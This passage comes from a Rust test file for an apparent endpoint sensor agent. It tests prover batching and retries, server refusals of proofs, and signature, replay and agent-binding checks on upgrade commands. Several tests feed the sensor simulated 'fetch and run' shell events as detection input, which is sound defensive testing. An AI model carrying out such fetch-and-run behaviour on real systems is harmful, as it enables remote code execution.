        assert!(wait_until(|| receipts(&server).len() == 2));
        assert_eq!(receipts(&server)[0], b"receipt of the stand-in");
        assert_eq!(server.requests_to("/api/proofs")[0]["agent_id"], runtime.link.agent_id());

        let input = proof::Input::from_bytes(&std::fs::read(dir.join("zedr-prover.input")).unwrap()).unwrap();
        assert_eq!((input.agent, input.fresh, input.windows.len(), input.windows[0].events.len()), (agent_hash(&dir), true, 1, 4));
        let (journal, _) = proof::run(input).unwrap();
        assert_eq!(
            (journal.first_window, hash_to_hex(&journal.head_out), journal.matches.len()),
            (0, taken(&server)[0].header.head.clone(), 1),
            "the prover was given the window the server holds, the next proof covers the window that came meanwhile"
        );
        assert!(wait_until(|| !window_file(&dir, 0).exists() && !window_file(&dir, 1).exists()), "proven plaintext is removed");
        assert!(wait_until(|| !dir.join("ledger").join("proofs").exists()), "and so is what was written for the prover");
        assert!(!platform.logged("Proving failed"));

        stop(&runtime, &dir);
    }

    #[test]
    fn test_proving_rests_after_a_proof_until_a_whole_proof_of_events_waits() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("proving-rests");
        let prover = ProverSettings { max_events: 5, rest: Duration::from_secs(3600), ..stand_in_prover(&dir, r#"printf 'receipt of the stand-in' > "$3""#) };
        let (runtime, _platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        runtime.start_sensor_with(source.clone(), every_50_milliseconds(), prover, short_refusal_wait());
        assert!(wait_until(|| receipts(&server).len() == 1), "the first proof starts at once");

        let delivered = |server: &StubServer| taken(server).iter().map(|window| window.header.count).sum::<u32>();
        source.run(901, 2, SHELL, &FETCH_AND_RUN);
        source.run(902, 2, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| delivered(&server) == 6));
        thread::sleep(Duration::from_millis(400));
        assert_eq!(receipts(&server).len(), 1, "two events wait, and the prover rests");
        assert!(proof_files(&dir, "input-").is_empty());

        for pid in 903..906 {
            source.run(pid, 2, SHELL, &FETCH_AND_RUN);
        }
        assert!(wait_until(|| receipts(&server).len() == 2), "five events wait, which is a whole proof, so the rest is over");

        stop(&runtime, &dir);
    }

    #[test]
    fn test_prover_that_fails_is_tried_again_later_and_the_sensor_goes_on() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("proving-fails");
        let prover = stand_in_prover(
            &dir,
            r#"printf '%s\n%s\n' "$2" "$3" >> "$0.attempts"
if [ -e "$0.failed" ]; then printf 'second attempt' > "$3"; else : > "$0.failed"; exit 3; fi"#,
        );
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        runtime.start_sensor_with(source.clone(), every_50_milliseconds(), prover, short_refusal_wait());
        assert!(wait_until(|| platform.logged("Proving failed, next attempt in 1s: The prover ended with exit status: 3")));
        assert!(window_file(&dir, 0).exists(), "the plaintext stays for the next attempt");
        assert!(receipts(&server).is_empty());

        source.run(901, 2, SHELL, &FETCH_AND_RUN);
        assert!(wait_until(|| taken(&server).len() == 2), "windows are delivered whatever the prover does");

        assert!(wait_until(|| !receipts(&server).is_empty()));
        assert_eq!(receipts(&server)[0], b"second attempt");
        assert!(wait_until(|| platform.logged("Proofs are being accepted again")));

        let attempts = std::fs::read_to_string(dir.join("zedr-prover.attempts")).unwrap();
        let files: Vec<&std::path::Path> = attempts.lines().map(std::path::Path::new).collect();
        let name = |file: &std::path::Path| file.file_name().unwrap().to_str().unwrap().to_string();
        assert!(files[..4].iter().all(|file| file.parent() == Some(dir.join("ledger").join("proofs").as_path())));
        assert!(
            name(files[0]).starts_with("input-0-") && name(files[2]).starts_with("input-0-") && files[0] != files[2],
            "the same windows, and an input file of its own"
        );
        assert!(
            name(files[1]).starts_with("receipt-0-") && name(files[3]).starts_with("receipt-0-") && files[1] != files[3],
            "a prover left over from the first attempt cannot write the receipt of the second"
        );
        assert!(wait_until(|| !window_file(&dir, 0).exists() && !window_file(&dir, 1).exists()));

        stop(&runtime, &dir);
    }

    #[test]
    fn test_proof_the_server_refuses_keeps_the_plaintext_and_is_made_again_later() {
        let refusals = Arc::new(Mutex::new(1));
        let left = Arc::clone(&refusals);
        let server = StubServer::start(move |request| {
            let mut left = left.lock().unwrap();
            if request.path == "/api/proofs" && *left > 0 {
                *left -= 1;
                return (422, "{}".to_string());
            }
            accept_everything(request)
        });
        let dir = state_dir("proving-refused");
        let prover = stand_in_prover(&dir, r#"printf 'receipt of the stand-in' > "$3""#);
        let (runtime, platform) = runtime(&server, &dir);
        let source = ScriptedSource::with(3);
        source.run(900, 3, SHELL, &FETCH_AND_RUN);

        runtime.start_sensor_with(source.clone(), every_50_milliseconds(), prover, short_refusal_wait());
        assert!(wait_until(|| platform.logged("Proving failed, next attempt in 1s: HTTP 422")));
        assert!(window_file(&dir, 0).exists());

        assert!(wait_until(|| platform.logged("Proofs are being accepted again")));
        assert_eq!(receipts(&server).len(), 2);
        assert!(wait_until(|| !window_file(&dir, 0).exists()));

        stop(&runtime, &dir);
    }

    fn restart(server: &StubServer, dir: &std::path::Path, nonce: &str) -> (Arc<Runtime<Arc<TestPlatform>>>, Arc<TestPlatform>) {
        crate::forget_nonce_as_a_new_process_would(nonce);
        runtime(server, dir)
    }

    fn signed_upgrade(key: &SigningKey, agent_id: &str, nonce: &str) -> UpgradeCommand {
        let issued_at = unix_now();
        let bytes = zedr_protocol::upgrade_command_signing_bytes(agent_id, "0.2.0", nonce, issued_at).unwrap();
        UpgradeCommand {
            agent_id: agent_id.to_string(),
            target_version: "0.2.0".to_string(),
            signature: key.sign(&bytes).to_bytes().to_vec(),
            issued_at,
            nonce: nonce.to_string(),
        }
    }

    #[test]
    fn test_upgrade_command_is_accepted_once_also_after_a_restart() {
        let name = "upgrade-restart";
        let dir = state_dir(name);
        let server = StubServer::start(accept_everything);
        let key = deployment_key();
        let trusted = key.verifying_key();
        let link = ControlLink::open_with_key_id(server.url.clone(), &dir).unwrap();
        let command = signed_upgrade(&key, link.agent_id(), name);

        assert_eq!(link.verify_upgrade_command_with_key(&trusted, &command), Ok(()));
        assert!(link.verify_upgrade_command_with_key(&trusted, &command).unwrap_err().contains("replay"));
        drop(link);

        let (restarted, _) = restart(&server, &dir, name);
        let refused = restarted.link.verify_upgrade_command_with_key(&trusted, &command).unwrap_err();
        assert!(refused.contains("already accepted by this agent"), "{}", refused);

        let for_another_agent = signed_upgrade(&key, "another-agent", "upgrade-other-agent");
        assert!(restarted.link.verify_upgrade_command_with_key(&trusted, &for_another_agent).unwrap_err().contains("different agent"));
        let by_another_key = signed_upgrade(&SigningKey::from_bytes(&[8u8; 32]), restarted.link.agent_id(), "upgrade-other-key");
        assert!(restarted.link.verify_upgrade_command_with_key(&trusted, &by_another_key).unwrap_err().contains("Signature verification failed"));
        let record: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(dir.join("accepted-commands.json")).unwrap()).unwrap();
        assert_eq!(record.as_array().unwrap().len(), 1, "a refused command is not recorded");
        assert_eq!(record[0]["nonce"], name);

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_upgrade_commands_are_refused_while_the_record_of_accepted_commands_cannot_be_read() {
        let name = "upgrade-record-corrupt";
        let dir = state_dir(name);
        std::fs::write(dir.join("accepted-commands.json"), "not a record").unwrap();
        let server = StubServer::start(accept_everything);
        let key = deployment_key();
        let (runtime, platform) = runtime(&server, &dir);
        assert!(platform.logged("Upgrade commands are refused: Record of accepted commands is corrupt"));

        let command = signed_upgrade(&key, runtime.link.agent_id(), name);
        let refused = runtime.link.verify_upgrade_command_with_key(&key.verifying_key(), &command).unwrap_err();
        assert!(refused.contains("Record of accepted commands is corrupt"), "{}", refused);
        assert_eq!(std::fs::read_to_string(dir.join("accepted-commands.json")).unwrap(), "not a record", "the record is left as it was");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_agent_that_was_not_sealed_by_a_control_server_accepts_no_upgrade_command() {
        let name = "upgrade-unsealed";
        let dir = state_dir(name);
        let link = ControlLink::open_with_key_id("http://unused".to_string(), &dir).unwrap();
        let command = signed_upgrade(&deployment_key(), link.agent_id(), name);

        let refused = link.verify_upgrade_command(&command).unwrap_err();
        assert!(refused.contains("not been patched"), "{}", refused);
        assert!(!dir.join("accepted-commands.json").exists(), "a refused command is not recorded");

        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_loop_ends_without_a_reason_when_the_stop_channel_is_gone() {
        let server = StubServer::start(accept_everything);
        let dir = state_dir("loop-disconnected");
        let (runtime, _) = runtime(&server, &dir);
        let (stop_tx, stop_rx) = mpsc::channel::<StopReason>();
        drop(stop_tx);

        assert_eq!(runtime.run_until_stopped(&stop_rx, Duration::from_millis(50)), None);

        std::fs::remove_dir_all(&dir).unwrap();
    }
}
